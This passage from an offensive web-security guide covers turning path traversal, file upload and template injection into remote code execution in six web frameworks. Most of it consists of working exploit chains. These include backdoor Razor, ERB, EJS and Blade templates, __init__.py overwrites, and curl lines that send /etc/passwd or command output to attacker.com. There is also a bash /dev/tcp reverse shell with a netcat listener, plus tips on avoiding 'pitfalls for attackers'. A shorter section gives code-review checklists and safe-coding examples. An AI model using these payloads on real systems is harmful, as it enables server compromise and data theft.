    echo "[!] Django: SSTI vulnerability detected!" | tee -a $OUTPUT

# Test Flask
echo -e "\n[*] Testing Python/Flask..." | tee -a $OUTPUT
curl -si "$TARGET/?test={​{config​}​​​​}" | grep -i "config\|werkzeug" && \
    echo "[!] Flask: SSTI vulnerability detected!" | tee -a $OUTPUT

# Test Go
echo -e "\n[*] Testing Go frameworks..." | tee -a $OUTPUT
curl -si "$TARGET/?test={​{.​}​​​​}" | grep -i "template.*error\|can't evaluate" && \
    echo "[!] Go: Possible template injection" | tee -a $OUTPUT

echo -e "\n[*] Scan complete. Results saved to $OUTPUT"
```

**Usage:**
```bash
chmod +x framework-vuln-scanner.sh
./framework-vuln-scanner.sh https://target.com
```

---

## Step 8: Framework-Specific Exploitation Chains

### ASP.NET MVC - Full Chain

```bash
# 1. Discover file upload with path traversal
curl -X POST https://target.com/upload \
    -F "file=@payload.txt" \
    -F "path=../../Views/Home/Backdoor.cshtml"

# 2. Upload malicious Razor view
cat > backdoor.cshtml << 'EOF'
@{
    var cmd = Request["cmd"];
    if (cmd != null) {
        var proc = System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd);
        proc.WaitForExit();
    }
}
EOF

# 3. Trigger execution
curl "https://target.com/Home/Backdoor?cmd=whoami"
```

---

### Ruby on Rails - Full Chain

```bash
# 1. Upload malicious ERB template
cat > evil.html.erb << 'EOF'
<%= `#{params[:cmd]}` %>
EOF

curl -X POST https://target.com/upload \
    -F "file=@evil.html.erb" \
    -F "path=../../app/views/pages/evil.html.erb"

# 2. Trigger via wildcard route
curl "https://target.com/pages/evil?cmd=curl%20http://attacker.com/%3Fdata=%24(cat%20/etc/passwd%7Cbase64)"

# OR - Upload malicious controller
cat > backdoor_controller.rb << 'EOF'
class BackdoorController < ApplicationController
  skip_before_action :verify_authenticity_token
  def shell
    render plain: `#{params[:cmd]}`
  end
end
EOF

curl -X POST https://target.com/upload \
    -F "file=@backdoor_controller.rb" \
    -F "path=../../app/controllers/backdoor_controller.rb"

# 3. Trigger auto-loading (requires route)
curl "https://target.com/backdoor/shell?cmd=whoami"
```

---

### Node.js/Express - Full Chain (No File Write!)

```bash
# Exploit via options injection - NO FILE WRITE NEEDED!

# 1. Identify vulnerable render endpoint
curl -i https://target.com/profile

# 2. Inject malicious outputFunctionName
PAYLOAD="x;process.mainModule.require('child_process').execSync('curl http://attacker.com/\?data=\$(whoami)');//"

curl "https://target.com/profile?settings[view%20options][outputFunctionName]=${PAYLOAD}"

# Or if file write is available:
cat > backdoor.ejs << 'EOF'
<%= process.mainModule.require('child_process').execSync(query.cmd).toString() %>
EOF

curl -X POST https://target.com/upload \
    -F "file=@backdoor.ejs" \
    -F "path=../../views/backdoor.ejs"

curl "https://target.com/backdoor?cmd=whoami"
```

---

### PHP/Laravel - Full Chain

```bash
# 1. Upload malicious Blade template
cat > backdoor.blade.php << 'EOF'
@php
    system($_GET['cmd']);
@endphp
EOF

curl -X POST https://target.com/upload \
    -F "file=@backdoor.blade.php" \
    -F "path=../../resources/views/backdoor.blade.php"

# 2. Trigger execution
curl "https://target.com/page/backdoor?cmd=whoami"
```

---

### Python/Django - Full Chain

```bash
# 1. Overwrite __init__.py in application package
cat > __init__.py << 'EOF'
import os
os.system('curl http://attacker.com/?data=$(whoami)')
EOF

curl -X POST https://target.com/upload \
    -F "file=@__init__.py" \
    -F "path=../../myapp/__init__.py"

# 2. Trigger reload (if debug mode) or wait for restart
# The payload executes on module import

# Alternative - SSTI if available:
curl "https://target.com/page?template={​{request.environ​}​​​​}"
```

---

### Python/Flask - Full Chain

```bash
# 1. Overwrite __init__.py
cat > __init__.py << 'EOF'
import os
os.system('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"')
EOF

curl -X POST https://target.com/upload \
    -F "file=@__init__.py" \
    -F "path=../../app/__init__.py"

# 2. In debug mode, changes auto-reload
# Listen on attacker machine:
nc -lvnp 4444

# Alternative - SSTI:
PAYLOAD="{​{config.__class__.__init__.__globals__['os'].popen('whoami').read()​}​​​​}"
curl "https://target.com/?name=${PAYLOAD}"
```

---

## Step 9: Code Review Checklist

### Universal Red Flags (All Frameworks)

- [ ] User input used in file paths without validation
- [ ] Dynamic view/template name resolution
- [ ] Wildcard routing patterns
- [ ] File upload with insufficient path validation
- [ ] Debug mode enabled in production
- [ ] Template/view rendering with user-controlled options
- [ ] Path traversal sequences (`../`) not filtered
- [ ] No whitelist for allowed views/templates

---

### Framework-Specific Red Flags

#### ASP.NET MVC
```csharp
// DANGEROUS
return View(userInput);
return View("~/Views/" + userInput + ".cshtml");

// SAFE
var allowedViews = new[] { "Profile", "Settings" };
if (allowedViews.Contains(viewName))
    return View(viewName);
```

---

#### Ruby on Rails
```ruby
# DANGEROUS
get '/*action', controller: 'pages'
render template: params[:template]

# SAFE
ALLOWED_ACTIONS = %w[index show profile].freeze
raise unless ALLOWED_ACTIONS.include?(params[:action])
render template: "pages/#{params[:action]}"
```

---

#### Node.js/Express
```javascript
// DANGEROUS
res.render(req.params.view, req.query);

// SAFE
const allowedViews = ['profile', 'settings'];
if (allowedViews.includes(req.params.view)) {
    const safeData = { name: req.query.name }; // Only specific fields
    res.render(req.params.view, safeData);
}
```

---

#### PHP/Laravel
```php
// DANGEROUS
return view($request->input('page'));

// SAFE
$allowedViews = ['home', 'profile', 'settings'];
$view = $request->input('page');
if (in_array($view, $allowedViews)) {
    return view($view);
}
```

---

#### Python/Django
```python
# DANGEROUS
return render(request, request.GET['template'])

# SAFE
from django.template.loader import select_template
allowed = ['home.html', 'profile.html']
template = select_template(allowed)
return HttpResponse(template.render({}, request))
```

---

#### Python/Flask
```python
# DANGEROUS
return render_template(request.args.get('page'))

# SAFE
allowed_templates = ['home.html', 'profile.html']
template = request.args.get('page')
if template in allowed_templates:
    return render_template(template)
```

---

#### Go
```go
// DANGEROUS
tmpl := template.Must(template.New("page").Parse(c.Query("content")))
tmpl.Execute(c.Writer, c)

// SAFE
tmpl := template.Must(template.ParseFiles("templates/safe.tmpl"))
// Validate all data before passing to template
data := gin.H{"name": sanitize(c.Query("name"))}
tmpl.Execute(c.Writer, data)
```

---

## Step 10: Quick Exploitation Decision Tree

```
[File Write Capability]
    |
    ├─ ASP.NET MVC?
    │   └─ Write to ~/Views/{Controller}/{Action}.cshtml → Trigger route → RCE
    |
    ├─ Ruby on Rails?
    │   ├─ Wildcard route exists?
    │   │   └─ Write .erb anywhere → Path traversal via URL → RCE
    │   └─ No wildcard?
    │       └─ Write to exact path: app/views/{controller}/{action}.erb → RCE
    |
    ├─ Node.js/Express?
    │   ├─ Options injection possible?
    │   │   └─ No file write needed! → Inject outputFunctionName → RCE
    │   └─ File write only?
    │       └─ Write to views/{template}.ejs → Trigger render → RCE
    |
    ├─ PHP/Laravel?
    │   └─ Write to resources/views/{name}.blade.php → Trigger view() → RCE
    |
    ├─ Python/Django?
    │   ├─ SSTI exists?
    │   │   └─ No file write needed! → SSTI payload → Limited RCE
    │   └─ File write only?
    │       └─ Write to {app}/__init__.py → Restart/import → RCE
    |
    ├─ Python/Flask?
    │   ├─ SSTI exists?
    │   │   └─ No file write needed! → SSTI payload → Limited RCE
    │   ├─ Debug mode?
    │   │   └─ Write to __init__.py → Auto-reload → RCE
    │   └─ Production?
    │       └─ Write to __init__.py → Wait for restart → RCE
    |
    └─ Go/Gin/Echo?
        ├─ SSTI exists?
        │   └─ File read via gadgets (not RCE)
        └─ No SSTI?
            └─ Very limited attack surface
```

---

## Step 11: Common Pitfalls for attackers

### Mistake 1: Wrong File Extension
```
❌ Rails: Uploading evil.html (won't execute)
✅ Rails: Upload evil.html.erb (will execute)

❌ Laravel: Uploading backdoor.php (might work but no Blade directives)
✅ Laravel: Upload backdoor.blade.php (full Blade functionality)

❌ Express: Uploading shell.js (won't be rendered)
✅ Express: Upload shell.ejs or shell.hbs (depends on engine)
```

---

### Mistake 2: Wrong Target Path
```
❌ Rails: Writing to public/ (static files, no execution)
✅ Rails: Write to app/views/ (executed by ERB engine)

❌ Django: Writing to static/ (no execution)
✅ Django: Write to {app}/__init__.py (executes on import)

❌ ASP.NET: Writing to ~/Content/ (static files)
✅ ASP.NET: Write to ~/Views/ (executed by Razor)
```

---

### Mistake 3: Not Understanding Auto-reload

**Flask/Django Debug Mode:**
- Files execute immediately on save (hot reload)
- Perfect for `__init__.py` overwrites

**Production Mode:**
- Changes require restart
- May need to wait for deployment or crash the app

**Rails Development:**
- Zeitwerk auto-reloads code changes
- Templates always reload

**Rails Production:**
- `config.eager_load = true` → No auto-loading
- Need exact paths

---

### Mistake 4: Forgetting Framework Constraints

**Go Templates:**
- Sandboxed - can't call arbitrary functions
- RCE is extremely difficult
- Focus on file reads via SSTI gadgets

**Django Templates:**
- Very limited by default
- Need specific gadgets for RCE
- `__init__.py` overwrite is more reliable

**Express:**
- Options injection is easier than file write
- Try that first!

---


## Summary Table

| Rank | Framework           | Reason                                      |
| ---- | ------------------- | ------------------------------------------- |
| 1    | **Node.js/Express** | No file write needed (options injection)    |
| 2    | **PHP/Laravel**     | Simple include, minimal protections         |
| 3    | **Ruby on Rails**   | Wildcard routes + ERB execution             |
| 4    | **ASP.NET MVC**     | View Engine patterns predictable            |
| 5    | **Python/Flask**    | SSTI or `__init__.py` (needs debug/restart) |
| 6    | **Python/Django**   | Requires `__init__.py` + restart/import     |
| 7    | **Go**              | Template sandboxing, no easy RCE            |

---

## Conclusion

The common theme across all frameworks:

**Framework-level file resolution mechanisms bypass web server protections.**

When developers rely on convention-over-configuration patterns:
1. Predictable file paths emerge
2. Automatic file loading creates attack surfaces
3. Path traversal + file write = RCE

**Key Insight:** Even without wildcard routing, if you can write to exact template/controller paths, you can achieve RCE in most frameworks.

**Defense:** Validate all file paths, never use dynamic template names, disable debug modes in production, and use explicit whitelisting.

---

## References

- CVE-2014-0130: Rails Wildcard Routing Path Traversal
- CVE-2022-29078: EJS Template Injection
- CVE-2022-25967: Eta Template Engine RCE
- ASP.NET MVC View Engine Research (by Diyan Apostolov) @ CTBB
- OWASP Testing Guide v4: Template Injection
- PortSwigger: Server-Side Template Injection